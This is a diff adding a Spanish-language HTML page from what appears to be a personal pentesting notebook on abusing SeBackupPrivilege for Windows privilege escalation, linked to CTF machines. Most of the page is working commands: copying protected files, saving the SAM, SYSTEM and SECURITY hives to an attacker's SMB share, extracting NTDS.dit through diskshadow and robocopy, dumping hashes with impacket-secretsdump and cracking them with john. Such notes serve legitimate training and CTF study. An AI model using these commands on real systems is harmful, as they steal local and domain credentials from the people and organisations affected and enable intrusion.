@@ -1,0 +1,178 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>Backup | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="backup">
+          <div class="note-tabbar">
+            <span>Backup</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Escalada de Privilegios/Windows/Privilegios</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">escalada de privilegios / windows / privilegios</p>
+            <h2>Backup</h2>
+
+            <aside class="callout warning">
+              <p><strong><a href="https://github.com/giuliano108/SeBackupPrivilege">SeBackupPrivilege</a></strong> Permite <code>leer archivos protegidos</code>, <code>SAM y SYSTEM</code>, <code>SECURITY</code> y <code>NTDS.dit</code> <a href="https://daniel10barredo.github.io/PrivEscAssist_Windows/tools/EnableSeBackupPrivilege.ps1">EnableSeBackupPrivilege.ps1</a>: Habilitar Privilegio si esta deshabilitado</p>
+            </aside>
+
+            <aside class="callout warning">
+              <p><code>SeBackupPrivilege</code> permite leer ficheros saltándose ACLs mediante semántica de backup. Para extraer secretos locales suelen hacer falta <code>SAM</code> y <code>SYSTEM</code>; en un DC, <code>NTDS.dit</code> contiene credenciales de dominio.</p>
+            </aside>
+
+            <section class="code-card">
+              <h3>PowerShell: Importar módulos</h3>
+              <pre><code>Import-Module .\SeBackupPrivilegeUtils.dll
+Import-Module .\SeBackupPrivilegeCmdLets.dll</code></pre>
+            </section>
+
+            <h2>Copiar y leer archivos protegidos</h2>
+
+            <section class="code-card">
+              <h3>PowerShell: Podemos copiar y leer archivos protegidos</h3>
+              <pre><code>Copy-FileSeBackupPrivilege 'C:\Confidential\Contract.txt' .\Contract.txt</code></pre>
+            </section>
+
+            <h2>Volcar SAM/SYSTEM/SECURITY del DC</h2>
+
+            <aside class="callout">
+              <p><strong><code>SAM</code>/<code>SYSTEM</code></strong> <code>SAM</code>: Almacena hashes de usuarios locales cifrados <code>SYSTEM</code>: LLave que descifra los hashes de <code>SAM</code></p>
+            </aside>
+
+            <aside class="callout">
+              <p><strong><code>SECURITY</code></strong> <code>SECURITY</code>: Almacena <code>LSA Secrets</code> del proceso <code>LSASS</code></p>
+            </aside>
+
+            <section class="code-card">
+              <h3>Extraer SAM/SYSTEM SECURITY</h3>
+              <pre><code># Kali: SMB Server
+impacket-smbserver recurso $(pwd) -smb2support
+
+# Extraer Datos desde Kali
+impacket-reg '&lt;dominio&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;target_ip&gt;' backup -o '\\&lt;kali_ip&gt;\recurso'
+# Extraer Datos desde Windows
+reg.exe save hklm\sam '\\&lt;kali_ip&gt;\recurso\SAM.save'
+reg.exe save hklm\system '\\&lt;kali_ip&gt;\recurso\SYSTEM.save'
+reg.exe save hklm\security '\\&lt;kali_ip&gt;\recurso\SECURITY.save'</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Volcar Registros</h3>
+              <pre><code># Dumpear SAM y SECURITY (LSA Secrets)
+impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
+# Dumpear SAM
+impacket-secretsdump -sam SAM.save -system SYSTEM.save LOCAL
+samdump2 SAM.save SYSTEM.save -o sam.txt
+
+# Crackear Hash
+john --format=NT --wordlist=rockyou.txt sam.txt</code></pre>
+            </section>
+
+            <h2>Volcar fichero NTDS.dit del DC</h2>
+
+            <section class="code-card">
+              <h3>Opción1 -&gt; DiskShadow EXEC: Extraer ntds.dit</h3>
+              <pre><code># Kali: Crear shadow.txt (cada línea debe tener un espacio extra al final porque falla)
+# shadow.txt
+set context persistent nowriters
+add volume c: alias unidad
+create
+expose %unidad% z:</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Lanzar diskshadow ejecutando shadow.txt</h3>
+              <pre><code># Windows
+diskshadow.exe /s c:\Temp\shadow.txt</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Recuperar el fichero ntds.dit que se encuentra en originalmente en c:\Windows\NTDS\ desde z:\Windows\NTDS\</h3>
+              <pre><code># Windows
+robocopy /b z:\Windows\NTDS\ . ntds.dit</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Opción2 -&gt; PowerShell DiskShadow GUI: Extraer ntds.dit</h3>
+              <pre><code>diskshadow.exe
+
+DISKSHADOW&gt; set verbose on
+DISKSHADOW&gt; set metadata C:\Windows\Temp\meta.cab
+DISKSHADOW&gt; set context clientaccessible
+DISKSHADOW&gt; set context persistent
+DISKSHADOW&gt; begin backup
+DISKSHADOW&gt; add volume C: alias cdrive
+DISKSHADOW&gt; create
+DISKSHADOW&gt; expose %cdrive% E:
+DISKSHADOW&gt; end backup
+DISKSHADOW&gt; exit
+
+Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Temp\ntds.dit</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Transferir archivo con SMB</h3>
+              <pre><code># Kali
+impacket-smbserver smb $(pwd) -smb2support -debug
+# Windows
+copy ntds.dit //&lt;kali_ip&gt;/smb/
+reg.exe save hklm\system \\kali_ip\smb\SYSTEM.save</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Kali: Volcar ntds.dit</h3>
+              <pre><code>impacket-secretsdump -ntds ntds.dit -system SYSTEM.save -hashes lmhash:nthash LOCAL</code></pre>
+            </section>
+
+            <h2>Máquinas relacionadas</h2>
+            <div class="notebook-related-links">
+              <a href="/writeups.html?machine=blackfield">Blackfield</a>
+              <a href="/writeups.html?machine=cicada">Cicada</a>
+            </div>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>notebook</span>
+              <span>windows</span>
+              <span>privesc</span>
+              <span>escalada_privilegios</span>
+              <span>privilegios</span>
+              <span>backup</span>
+              <span>backup_operators</span>
+              <span>robocopy</span>
+              <span>diskshadow</span>
+              <span>ntds</span>
+              <span>sam</span>
+              <span>system</span>
+              <span>security</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
